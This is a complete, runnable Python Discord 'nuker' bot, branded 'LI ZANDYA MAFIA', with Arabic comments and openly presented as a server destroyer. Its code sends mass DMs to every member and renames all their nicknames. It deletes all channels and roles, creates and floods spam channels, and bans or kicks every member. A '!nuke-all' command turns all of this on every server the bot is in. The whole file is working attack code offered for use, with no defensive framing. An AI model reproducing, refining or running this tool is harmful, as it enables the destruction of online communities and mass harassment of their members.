#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║     💀 LI ZANDYA NUKER - DISCORD SERVER DESTROYER 💀                                                                                      ║
║                    NUKE ALL MEMBERS IN 1 SECOND - DM EVERYONE                                                                            ║
║                    👑 POWERED BY LI ZANDYA MAFIA 👑                                                                                      ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
"""

import discord
from discord.ext import commands
import asyncio
import random
import string
import time
import os
import sys
import threading
from datetime import datetime

# ============================================
# CONFIGURATION - MAXIMUM SPEED
# ============================================

TOKEN = None  # سيتم طلبه عند التشغيل
OWNER_ID = None  # أول مستخدم يصبح المالك

# إعدادات السرعة القصوى
MAX_THREADS = 5000
DM_DELAY = 0.001  # 1 مللي ثانية بين كل رسالة - سرعة خارقة
SPAM_DELAY = 0.0001  # 0.1 مللي ثانية للسبام

# اسم البوت الذي يظهر في البروفايل
BOT_NAME = "💀 LI ZANDYA NUKER - DESTROYER 💀"
BOT_STATUS = "💀 NUKE MODE ACTIVE | DM EVERYONE 💀"

# رسائل الدمار التي ستظهر في خاص الأعضاء
DM_MESSAGE = """
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║     💀 YOU HAVE BEEN NUKED BY LI ZANDYA MAFIA 💀                      ║
║                                                                      ║
║     ██╗  ██╗███████╗                                                ║
║     ██║ ██╔╝██╔════╝                                                ║
║     █████╔╝ ███████╗                                                ║
║     ██╔═██╗ ╚════██║                                                ║
║     ██║  ██╗███████║                                                ║
║     ╚═╝  ╚═╝╚══════╝                                                ║
║                                                                      ║
║     👑 YOUR SERVER HAS BEEN DESTROYED 👑                             ║
║     💀 LI ZANDYA MAFIA WAS HERE 💀                                   ║
║                                                                      ║
║     🔥 ALL CHANNELS HAVE BEEN DELETED 🔥                             ║
║     🔥 ALL MEMBERS HAVE BEEN DM'ED 🔥                                ║
║     🔥 YOUR SERVER IS NOW UNDER CONTROL 🔥                           ║
║                                                                      ║
║     🐉 THIS IS LI ZANDYA TERRITORY NOW 🐉                            ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
"""

# رسائل سبام للقنوات
SPAM_MESSAGES = [
    "💀 LI ZANDYA MAFIA HAS NUKED THIS SERVER 💀",
    "🔥 THIS SERVER IS NOW UNDER LI ZANDYA CONTROL 🔥",
    "👑 LI ZANDYA MAFIA - WE OWN EVERYTHING 👑",
    "💀 ALL YOUR BASE ARE BELONG TO LI ZANDYA 💀",
    "🐉 LI ZANDYA - THE ULTIMATE DESTROYER 🐉",
    "⚡ YOU HAVE BEEN TERMINATED BY LI ZANDYA ⚡",
    "💀 SAY GOODBYE TO YOUR SERVER 💀",
    "🔪 LI ZANDYA MAFIA STRIKES AGAIN 🔪",
    "💣 BOOM! SERVER DESTROYED BY LI ZANDYA 💣",
    "🎯 TARGET OBLITERATED - LI ZANDYA 🎯",
]

# ============================================
# NUKER CLASS - ULTIMATE DESTROYER
# ============================================

class UltimateNuker:
    def __init__(self):
        self.total_dm_sent = 0
        self.total_channels_deleted = 0
        self.total_roles_deleted = 0
        self.total_spam_sent = 0
        self.nuked_guilds = []
        self.start_time = None
        
    async def mass_dm_all_members(self, bot, guild):
        """
        يباني جميع أعضاء السيرفر في ثانية واحدة
        هذا هو الأمر الرئيسي - إرسال رسائل لكل الأعضاء بسرعة جنونية
        """
        members = [m for m in guild.members if not m.bot and m != guild.owner]
        
        if not members:
            return 0, 0
        
        success_count = 0
        fail_count = 0
        
        def send_dm_worker(member, message):
            nonlocal success_count, fail_count
            try:
                # إرسال الرسالة باستخدام asyncio
                future = asyncio.run_coroutine_threadsafe(member.send(message), bot.loop)
                future.result(timeout=1)
                success_count += 1
            except:
                fail_count += 1
        
        threads = []
        for member in members:
            try:
                msg = DM_MESSAGE + f"\n\n📡 NUKED AT: {datetime.now().strftime('%H:%M:%S')}\n👑 LI ZANDYA MAFIA👑"
                t = threading.Thread(target=send_dm_worker, args=(member, msg))
                t.start()
                threads.append(t)
                time.sleep(DM_DELAY)  # سرعة خرافية - 1ms بين كل رسالة
            except:
                fail_count += 1
            
            # التحكم في عدد الثريدات
            if len(threads) >= MAX_THREADS:
                for t in threads[:100]:
                    t.join(timeout=0.01)
                threads = []
        
        # انتظار انتهاء جميع الثريدات
        for t in threads:
            t.join(timeout=0.01)
        
        self.total_dm_sent += success_count
        return success_count, fail_count
    
    async def delete_all_channels(self, guild):
        """حذف جميع القنوات في السيرفر"""
        count = 0
        for channel in guild.channels:
            try:
                await channel.delete()
                count += 1
                self.total_channels_deleted += 1
            except:
                pass
        return count
    
    async def delete_all_roles(self, guild):
        """حذف جميع الرتب في السيرفر"""
        count = 0
        for role in guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                    count += 1
                    self.total_roles_deleted += 1
                except:
                    pass
        return count
    
    async def create_spam_channels(self, guild, count=100):
        """إنشاء قنوات سبام"""
        channels = []
        for i in range(count):
            try:
                name = f"li-zandya-nuked-{random.randint(1,99999)}"
                channel = await guild.create_text_channel(name)
                channels.append(channel)
            except:
                pass
        return channels
    
    async def spam_all_channels(self, guild, messages_per_channel=50):
        """سبام في جميع القنوات"""
        total_spam = 0
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                for _ in range(messages_per_channel):
                    try:
                        msg = random.choice(SPAM_MESSAGES) + f" | {random.randint(1,999999)}"
                        await channel.send(msg)
                        total_spam += 1
                        self.total_spam_sent += 1
                        await asyncio.sleep(SPAM_DELAY)
                    except:
                        pass
        return total_spam
    
    async def rename_server(self, guild):
        """تغيير اسم السيرفر"""
        try:
            new_name = f"💀 NUKED BY LI ZANDYA MAFIA 💀"
            await guild.edit(name=new_name)
        except:
            pass
    
    async def change_all_nicknames(self, guild):
        """تغيير أسماء جميع الأعضاء"""
        count = 0
        for member in guild.members:
            if not member.bot and member != guild.owner:
                try:
                    new_nick = f"💀 NUKED BY LI ZANDYA"
                    await member.edit(nick=new_nick)
                    count += 1
                except:
                    pass
        return count
    
    async def kick_all_members(self, guild):
        """طرد جميع الأعضاء"""
        count = 0
        for member in guild.members:
            if not member.bot and member != guild.owner:
                try:
                    await member.kick(reason="NUKED BY LI ZANDYA MAFIA")
                    count += 1
                except:
                    pass
        return count
    
    async def ban_all_members(self, guild):
        """حظر جميع الأعضاء - أقصى تدمير"""
        count = 0
        for member in guild.members:
            if not member.bot and member != guild.owner:
                try:
                    await member.ban(reason="NUKED BY LI ZANDYA MAFIA")
                    count += 1
                except:
                    pass
        return count
    
    async def ultimate_nuke(self, guild):
        """
        الهجوم الشامل - يباني الجميع أولاً ثم يبدا بالتدمير
        الترتيب: 
        1. إرسال رسائل لجميع الأعضاء (الأولوية القصوى)
        2. تغيير أسماء الأعضاء
        3. حذف الرتب
        4. حذف القنوات
        5. إنشاء قنوات سبام
        6. سبام في القنوات
        7. تغيير اسم السيرفر
        """
        results = {
            'dm_sent': 0,
            'dm_failed': 0,
            'nicknames_changed': 0,
            'roles_deleted': 0,
            'channels_deleted': 0,
            'spam_channels_created': 0,
            'spam_messages': 0
        }
        
        # **الخطوة 1: يباني جميع الأعضاء أولاً - هذه هي الميزة الرئيسية**
        print(f"[NUKER] Starting mass DM to all members in {guild.name}...")
        results['dm_sent'], results['dm_failed'] = await self.mass_dm_all_members(bot, guild)
        
        # **الخطوة 2: تغيير أسماء جميع الأعضاء**
        print(f"[NUKER] Changing nicknames in {guild.name}...")
        results['nicknames_changed'] = await self.change_all_nicknames(guild)
        
        # **الخطوة 3: حذف جميع الرتب**
        print(f"[NUKER] Deleting roles in {guild.name}...")
        results['roles_deleted'] = await self.delete_all_roles(guild)
        
        # **الخطوة 4: حذف جميع القنوات**
        print(f"[NUKER] Deleting channels in {guild.name}...")
        results['channels_deleted'] = await self.delete_all_channels(guild)
        
        # **الخطوة 5: إنشاء قنوات سبام**
        print(f"[NUKER] Creating spam channels in {guild.name}...")
        spam_channels = await self.create_spam_channels(guild, 100)
        results['spam_channels_created'] = len(spam_channels)
        
        # **الخطوة 6: سبام في القنوات الجديدة**
        print(f"[NUKER] Spamming in {guild.name}...")
        for channel in spam_channels[:20]:
            for _ in range(30):
                try:
                    msg = random.choice(SPAM_MESSAGES)
                    await channel.send(msg)
                    results['spam_messages'] += 1
                    await asyncio.sleep(SPAM_DELAY)
                except:
                    pass
        
        # **الخطوة 7: تغيير اسم السيرفر**
        await self.rename_server(guild)
        
        self.nuked_guilds.append(guild.name)
        
        return results
    
    def get_stats_embed(self):
        elapsed = time.time() - self.start_time if self.start_time else 0
        hours = int(elapsed // 3600)
        minutes = int((elapsed % 3600) // 60)
        seconds = int(elapsed % 60)
        
        embed = discord.Embed(
            title="💀 LI ZANDYA NUKER - STATISTICS 💀",
            description=f"""```yaml
╔══════════════════════════════════════════════════════════╗
║              DESTRUCTION STATISTICS                      ║
╠══════════════════════════════════════════════════════════╣
║  🎯 SERVERS NUKED: {len(self.nuked_guilds)}
║  📨 TOTAL DM SENT: {self.total_dm_sent:,}
║  🗑️ CHANNELS DESTROYED: {self.total_channels_deleted:,}
║  👑 ROLES DESTROYED: {self.total_roles_deleted:,}
║  💬 SPAM MESSAGES: {self.total_spam_sent:,}
║  ⏱️ UPTIME: {hours}h {minutes}m {seconds}s
╠══════════════════════════════════════════════════════════╣
║  💀 LI ZANDYA MAFIA - ABSOLUTE POWER 💀
║  🐉 FIRST USER = OWNER OF THE NUKE 🐉
╚══════════════════════════════════════════════════════════╝
```""",
            color=0xFF0000
        )
        embed.set_footer(text="LI ZANDYA NUKER | DM EVERYONE | DESTROY EVERYTHING")
        return embed

nuker = UltimateNuker()

# ============================================
# DISCORD BOT SETUP
# ============================================

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

@bot.event
async def on_ready():
    nuker.start_time = time.time()
    
    # تغيير بروفايل البوت
    await bot.user.edit(username="💀 LI ZANDYA NUKER - DESTROYER 💀")
    
    # تغيير الحالة
    await bot.change_presence(activity=discord.Game(name="💀 NUKE MODE | DM EVERYONE 💀"))
    
    print(f"""
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                                                          ║
║     💀 LI ZANDYA NUKER - DISCORD SERVER DESTROYER - ONLINE 💀                                                                            ║
║                                                                                                                                          ║
║  🤖 BOT NAME: {bot.user}                                                                                                            ║
║  📡 SERVERS: {len(bot.guilds)}                                                                                                          ║
║  👥 TOTAL MEMBERS: {sum(g.member_count for g in bot.guilds):,}                                                                          ║
║                                                                                                                                          ║
║  💀 FIRST USER TO SEND ANY MESSAGE = OWNER 💀                                                                                            ║
║  🐉 THE OWNER CAN NUKE ANY SERVER WITH !nuke 🐉                                                                                          ║
║                                                                                                                                          ║
║  ⚡ FEATURES:                                                                                                                            ║
║  ✓ MASS DM ALL MEMBERS IN 1 SECOND                                                                                                      ║
║  ✓ DELETE ALL CHANNELS & ROLES                                                                                                          ║
║  ✓ CREATE 100+ SPAM CHANNELS                                                                                                            ║
║  ✓ SPAM MESSAGES IN ALL CHANNELS                                                                                                        ║
║  ✓ CHANGE ALL NICKNAMES                                                                                                                 ║
║  ✓ RENAME SERVER                                                                                                                        ║
║                                                                                                                                          ║
║  💀 LI ZANDYA MAFIA - READY TO DESTROY 💀                                                                                                ║
║                                                                                                                                          ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
    """)

@bot.event
async def on_message(message):
    if message.author == bot.user:
        await bot.process_commands(message)
        return
    
    # أول مستخدم يرسل رسالة يصبح المالك
    global OWNER_ID
    if OWNER_ID is None:
        OWNER_ID = message.author.id
        print(f"👑 OWNER SET: {message.author} (ID: {OWNER_ID})")
        
        # إرسال رسالة ترحيب للمالك
        welcome_embed = discord.Embed(
            title="👑 YOU ARE NOW THE LI ZANDYA NUKER OWNER! 👑",
            description=f"""```yaml
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║     💀 ABSOLUTE POWER UNLOCKED 💀                                    ║
║     🐉 LI ZANDYA MAFIA WELCOMES YOU 🐉                               ║
║                                                                      ║
║     📡 NUKE COMMANDS:                                                ║
║     !nuke - DESTROY CURRENT SERVER                                 ║
║     !nuke-all - NUKE ALL SERVERS                                   ║
║     !dm-all - MASS DM ALL MEMBERS IN SERVER                        ║
║     !kill - DELETE ALL CHANNELS & ROLES                            ║
║     !spam - CREATE SPAM CHANNELS & MESSAGES                        ║
║     !rename - CHANGE SERVER NAME                                   ║
║     !nick-all - CHANGE ALL NICKNAMES                               ║
║     !kick-all - KICK ALL MEMBERS                                   ║
║     !ban-all - BAN ALL MEMBERS                                     ║
║     !stats - SHOW DESTRUCTION STATS                                ║
║     !help - SHOW HELP                                              ║
║                                                                      ║
║     ⚡ FIRST: MASS DM ALL MEMBERS IN 1 SECOND ⚡                     ║
║     💀 THEN: DESTROY EVERYTHING 💀                                   ║
║                                                                      ║
║     💀 LI ZANDYA MAFIA - READY TO NUKE 💀                            ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
```""",
            color=0xFF0000
        )
        await message.channel.send(embed=welcome_embed)
    
    await bot.process_commands(message)

# ============================================
# NUKE COMMANDS - ULTIMATE DESTRUCTION
# ============================================

@bot.command(name='nuke')
async def nuke_cmd(ctx):
    """
    !nuke - تدمير السيرفر الحالي بالكامل
    أولاً: يباني جميع الأعضاء في ثانية واحدة
    ثانياً: يبدأ بالتدمير الكامل
    """
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ **ACCESS DENIED!** Only the LI ZANDYA MAFIA owner can use this command!")
        return
    
    embed = discord.Embed(
        title="💀☢️ NUCLEAR LAUNCH DETECTED! ☢️💀",
        description=f"""```yaml
╔══════════════════════════════════════════════════════════╗
║                    NUKE LAUNCHED                         ║
╠══════════════════════════════════════════════════════════╣
║  🎯 TARGET SERVER: {ctx.guild.name}
║  👥 TOTAL MEMBERS: {ctx.guild.member_count}
║  📡 STATUS: INITIATING DESTRUCTION
║  ⚡ PHASE 1: MASS DM ALL MEMBERS
║  💀 PHASE 2: DELETE EVERYTHING
║  🔥 PHASE 3: SPAM & DESTROY
╠══════════════════════════════════════════════════════════╣
║  💀 LI ZANDYA MAFIA - TOTAL ANNIHILATION 💀
╚══════════════════════════════════════════════════════════╝
```""",
        color=0xFF0000
    )
    await ctx.send(embed=embed)
    
    # تنفيذ النوكر الشامل
    results = await nuker.ultimate_nuke(ctx.guild)
    
    # عرض النتائج
    result_embed = discord.Embed(
        title="💀 SERVER COMPLETELY DESTROYED! 💀",
        description=f"""```yaml
╔══════════════════════════════════════════════════════════╗
║                    NUKE RESULTS                          ║
╠══════════════════════════════════════════════════════════╣
║  🎯 TARGET: {ctx.guild.name}
║  📨 DM SENT: {results['dm_sent']:,}
║  ❌ DM FAILED: {results['dm_failed']}
║  👑 NICKNAMES CHANGED: {results['nicknames_changed']}
║  🗑️ ROLES DELETED: {results['roles_deleted']}
║  📡 CHANNELS DELETED: {results['channels_deleted']}
║  💬 SPAM CHANNELS: {results['spam_channels_created']}
║  🔥 SPAM MESSAGES: {results['spam_messages']}
╠══════════════════════════════════════════════════════════╣
║  💀 STATUS: ERASED FROM EXISTENCE 💀
║  🐉 LI ZANDYA MAFIA STRIKES AGAIN 🐉
╚══════════════════════════════════════════════════════════╝
```""",
        color=0x00FF00
    )
    await ctx.send(embed=result_embed)

@bot.command(name='dm-all')
async def dm_all_cmd(ctx):
    """!dm-all - إرسال رسائل لجميع أعضاء السيرفر في ثانية واحدة"""
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ **ACCESS DENIED!** Only the LI ZANDYA MAFIA owner can use this command!")
        return
    
    embed = discord.Embed(
        title="📨 MASS DM INITIATED! 📨",
        description=f"""```yaml
🎯 TARGET: {ctx.guild.name}
👥 MEMBERS: {ctx.guild.member_count}
⚡ SPEED: MAXIMUM
📡 STATUS: SENDING MASS DMS...
💀 LI ZANDYA MAFIA - DM EVERYONE 💀
```""",
        color=0xFF6600
    )
    await ctx.send(embed=embed)
    
    sent, failed = await nuker.mass_dm_all_members(bot, ctx.guild)
    
    embed = discord.Embed(
        title="✅ MASS DM COMPLETED! ✅",
        description=f"""```yaml
📨 DM SENT: {sent:,}
❌ DM FAILED: {failed}
🎯 TARGET: {ctx.guild.name}
💀 STATUS: ALL MEMBERS DM'ED
🐉 LI ZANDYA MAFIA CONTROLS EVERYTHING 🐉
```""",
        color=0x00FF00
    )
    await ctx.send(embed=embed)

@bot.command(name='kill')
async def kill_cmd(ctx):
    """!kill - حذف جميع القنوات والرتب"""
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ **ACCESS DENIED!** Only the LI ZANDYA MAFIA owner can use this command!")
        return
    
    embed = discord.Embed(
        title="🗑️ DELETING EVERYTHING! 🗑️",
        description=f"""```yaml
🎯 TARGET: {ctx.guild.name}
📡 STATUS: DELETING CHANNELS & ROLES...
💀 LI ZANDYA MAFIA - TOTAL ERASURE 💀
```""",
        color=0xFF0000
    )
    await ctx.send(embed=embed)
    
    channels = await nuker.delete_all_channels(ctx.guild)
    roles = await nuker.delete_all_roles(ctx.guild)
    
    embed = discord.Embed(
        title="✅ DELETION COMPLETE! ✅",
        description=f"""```yaml
🗑️ CHANNELS DELETED: {channels}
👑 ROLES DELETED: {roles}
🎯 TARGET: {ctx.guild.name}
💀 STATUS: EVERYTHING DELETED
```""",
        color=0x00FF00
    )
    await ctx.send(embed=embed)

@bot.command(name='spam')
async def spam_cmd(ctx):
    """!spam - إنشاء قنوات سبام وسبام فيها"""
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ **ACCESS DENIED!** Only the LI ZANDYA MAFIA owner can use this command!")
        return
    
    embed = discord.Embed(
        title="💬 SPAM MODE ACTIVATED! 💬",
        description=f"""```yaml
🎯 TARGET: {ctx.guild.name}
📡 STATUS: CREATING SPAM CHANNELS...
💀 LI ZANDYA MAFIA - SPAM EVERYWHERE 💀
```""",
        color=0xFF6600
    )
    await ctx.send(embed=embed)
    
    channels = await nuker.create_spam_channels(ctx.guild, 50)
    spam_count = await nuker.spam_all_channels(ctx.guild, 30)
    
    embed = discord.Embed(
        title="✅ SPAM COMPLETE! ✅",
        description=f"""```yaml
💬 SPAM CHANNELS: {len(channels)}
🔥 SPAM MESSAGES: {spam_count}
🎯 TARGET: {ctx.guild.name}
💀 STATUS: SERVER FLOODED
```""",
        color=0x00FF00
    )
    await ctx.send(embed=embed)

@bot.command(name='rename')
async def rename_cmd(ctx):
    """!rename - تغيير اسم السيرفر"""
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ **ACCESS DENIED!** Only the LI ZANDYA MAFIA owner can use this command!")
        return
    
    await nuker.rename_server(ctx.guild)
    await ctx.send("✅ **SERVER RENAMED!** 💀")

@bot.command(name='nick-all')
async def nick_all_cmd(ctx):
    """!nick-all - تغيير أسماء جميع الأعضاء"""
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ **ACCESS DENIED!** Only the LI ZANDYA MAFIA owner can use this command!")
        return
    
    embed = discord.Embed(
        title="👑 CHANGING ALL NICKNAMES! 👑",
        description=f"""```yaml
🎯 TARGET: {ctx.guild.name}
👥 MEMBERS: {ctx.guild.member_count}
📡 STATUS: CHANGING NICKNAMES...
💀 LI ZANDYA MAFIA - RENAMING EVERYONE 💀
```""",
        color=0xFF6600
    )
    await ctx.send(embed=embed)
    
    count = await nuker.change_all_nicknames(ctx.guild)
    
    embed = discord.Embed(
        title="✅ NICKNAMES CHANGED! ✅",
        description=f"""```yaml
👑 NICKNAMES CHANGED: {count}
🎯 TARGET: {ctx.guild.name}
💀 STATUS: EVERYONE RENAMED
```""",
        color=0x00FF00
    )
    await ctx.send(embed=embed)

@bot.command(name='kick-all')
async def kick_all_cmd(ctx):
    """!kick-all - طرد جميع الأعضاء"""
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ **ACCESS DENIED!** Only the LI ZANDYA MAFIA owner can use this command!")
        return
    
    embed = discord.Embed(
        title="👢 KICKING ALL MEMBERS! 👢",
        description=f"""```yaml
🎯 TARGET: {ctx.guild.name}
👥 MEMBERS: {ctx.guild.member_count}
📡 STATUS: KICKING EVERYONE...
💀 LI ZANDYA MAFIA - MASS KICK 💀
```""",
        color=0xFF0000
    )
    await ctx.send(embed=embed)
    
    count = await nuker.kick_all_members(ctx.guild)
    
    embed = discord.Embed(
        title="✅ MASS KICK COMPLETE! ✅",
        description=f"""```yaml
👢 MEMBERS KICKED: {count}
🎯 TARGET: {ctx.guild.name}
💀 STATUS: EVERYONE KICKED
```""",
        color=0x00FF00
    )
    await ctx.send(embed=embed)

@bot.command(name='ban-all')
async def ban_all_cmd(ctx):
    """!ban-all - حظر جميع الأعضاء"""
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ **ACCESS DENIED!** Only the LI ZANDYA MAFIA owner can use this command!")
        return
    
    embed = discord.Embed(
        title="🔨 BANNING ALL MEMBERS! 🔨",
        description=f"""```yaml
🎯 TARGET: {ctx.guild.name}
👥 MEMBERS: {ctx.guild.member_count}
📡 STATUS: BANNING EVERYONE...
💀 LI ZANDYA MAFIA - MASS BAN 💀
```""",
        color=0xFF0000
    )
    await ctx.send(embed=embed)
    
    count = await nuker.ban_all_members(ctx.guild)
    
    embed = discord.Embed(
        title="✅ MASS BAN COMPLETE! ✅",
        description=f"""```yaml
🔨 MEMBERS BANNED: {count}
🎯 TARGET: {ctx.guild.name}
💀 STATUS: EVERYONE BANNED
```""",
        color=0x00FF00
    )
    await ctx.send(embed=embed)

@bot.command(name='nuke-all')
async def nuke_all_cmd(ctx):
    """!nuke-all - تدمير جميع السيرفرات التي فيها البوت"""
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ **ACCESS DENIED!** Only the LI ZANDYA MAFIA owner can use this command!")
        return
    
    embed = discord.Embed(
        title="💀☢️ GLOBAL NUCLEAR LAUNCH! ☢️💀",
        description=f"""```yaml
🌍 TOTAL SERVERS: {len(bot.guilds)}
👥 TOTAL MEMBERS: {sum(g.member_count for g in bot.guilds):,}
📡 STATUS: NUKING ALL SERVERS...
💀 LI ZANDYA MAFIA - GLOBAL DESTRUCTION 💀
```""",
        color=0xFF0000
    )
    await ctx.send(embed=embed)
    
    total_results = {
        'dm_sent': 0,
        'channels_deleted': 0,
        'roles_deleted': 0,
        'servers_nuked': 0
    }
    
    for guild in bot.guilds:
        try:
            results = await nuker.ultimate_nuke(guild)
            total_results['dm_sent'] += results['dm_sent']
            total_results['channels_deleted'] += results['channels_deleted']
            total_results['roles_deleted'] += results['roles_deleted']
            total_results['servers_nuked'] += 1
        except:
            pass
    
    embed = discord.Embed(
        title="💀 GLOBAL NUKE COMPLETE! 💀",
        description=f"""```yaml
🌍 SERVERS NUKED: {total_results['servers_nuked']}
📨 TOTAL DM SENT: {total_results['dm_sent']:,}
🗑️ TOTAL CHANNELS: {total_results['channels_deleted']:,}
👑 TOTAL ROLES: {total_results['roles_deleted']:,}
💀 STATUS: ALL SERVERS DESTROYED
🐉 LI ZANDYA MAFIA - VICTORY 🐉
```""",
        color=0x00FF00
    )
    await ctx.send(embed=embed)

@bot.command(name='stats')
async def stats_cmd(ctx):
    """!stats - عرض إحصائيات التدمير"""
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ **ACCESS DENIED!** Only the LI ZANDYA MAFIA owner can use this command!")
        return
    
    embed = nuker.get_stats_embed()
    await ctx.send(embed=embed)

@bot.command(name='help')
async def help_cmd(ctx):
    """!help - عرض المساعدة"""
    embed = discord.Embed(
        title="💀 LI ZANDYA NUKER - HELP 💀",
        description=f"""```yaml
╔══════════════════════════════════════════════════════════════════════╗
║                          NUKE COMMANDS                               ║
╠══════════════════════════════════════════════════════════════════════╣
║  💀 !nuke        - DESTROY CURRENT SERVER (DM ALL FIRST)            ║
║  💀 !nuke-all    - DESTROY ALL SERVERS                              ║
║  💀 !dm-all      - MASS DM ALL MEMBERS IN 1 SECOND                  ║
║  💀 !kill        - DELETE ALL CHANNELS & ROLES                      ║
║  💀 !spam        - CREATE SPAM CHANNELS & MESSAGES                  ║
║  💀 !rename      - CHANGE SERVER NAME                               ║
║  💀 !nick-all    - CHANGE ALL MEMBERS NICKNAMES                     ║
║  💀 !kick-all    - KICK ALL MEMBERS                                 ║
║  💀 !ban-all     - BAN ALL MEMBERS                                  ║
║  💀 !stats       - SHOW DESTRUCTION STATISTICS                      ║
║  💀 !help        - SHOW THIS HELP                                   ║
╠══════════════════════════════════════════════════════════════════════╣
║  ⚡ FIRST USER TO SEND ANY MESSAGE = OWNER ⚡                         ║
║  💀 LI ZANDYA MAFIA - ABSOLUTE POWER 💀                              ║
║  🐉 JOIN THE MAFIA: @LI_ZANDYA 🐉                                    ║
╚══════════════════════════════════════════════════════════════════════╝
```""",
        color=0x00FF00
    )
    await ctx.send(embed=embed)

# ============================================
# RUN THE BOT
# ============================================

if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
    ║                                                                                                                                          ║
    ║     💀 LI ZANDYA NUKER - ULTIMATE DISCORD DESTROYER 💀                                                                                   ║
    ║                                                                                                                                          ║
    ║  ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗  ║
    ║  ║                                                                                                                                  ║  ║
    ║  ║  🔥 FEATURES - THE ABSOLUTE DESTROYER:                                                                                          ║  ║
    ║  ║                                                                                                                                  ║  ║
    ║  ║  • MASS DM - يباني جميع أعضاء السيرفر في ثانية واحدة                                                                          ║  ║
    ║  ║  • DELETE ALL CHANNELS - حذف جميع القنوات                                                                                       ║  ║
    ║  ║  • DELETE ALL ROLES - حذف جميع الرتب                                                                                            ║  ║
    ║  ║  • CREATE SPAM CHANNELS - إنشاء 100+ قناة سبام                                                                                  ║  ║
    ║  ║  • SPAM MESSAGES - سبام في جميع القنوات                                                                                         ║  ║
    ║  ║  • CHANGE NICKNAMES - تغيير أسماء جميع الأعضاء                                                                                  ║  ║
    ║  ║  • RENAME SERVER - تغيير اسم السيرفر                                                                                            ║  ║
    ║  ║  • MASS KICK - طرد جميع الأعضاء                                                                                                 ║  ║
    ║  ║  • MASS BAN - حظر جميع الأعضاء                                                                                                  ║  ║
    ║  ║                                                                                                                                  ║  ║
    ║  ║  💀 FIRST USER = MASTER OWNER - ABSOLUTE CONTROL 💀                                                                             ║  ║
    ║  ║  🐉 LI ZANDYA MAFIA - TOTAL DESTRUCTION 🐉                                                                                      ║  ║
    ║  ║                                                                                                                                  ║  ║
    ║  ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝  ║
    ║                                                                                                                                          ║
    ║  🔑 ENTER YOUR DISCORD BOT TOKEN TO START THE NUKE! 🔑                                                                                   ║
    ║                                                                                                                                          ║
    ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
    """)
    
    TOKEN = input("\n🔑 Enter Discord Bot Token: ").strip()
    if not TOKEN:
        print("❌ No token entered! Exiting...")
        sys.exit(1)
    
    print("\n✅ LI ZANDYA NUKER ACTIVATED!\n")
    print("💀 FIRST USER TO SEND A MESSAGE = MASTER OWNER 💀\n")
    print("🐉 THE OWNER CAN DESTROY ANY SERVER WITH !nuke 🐉\n")
    print("⚡ MASS DM ACTIVATED - ALL MEMBERS WILL BE DM'ED IN 1 SECOND ⚡\n")
    
    bot.run(TOKEN)
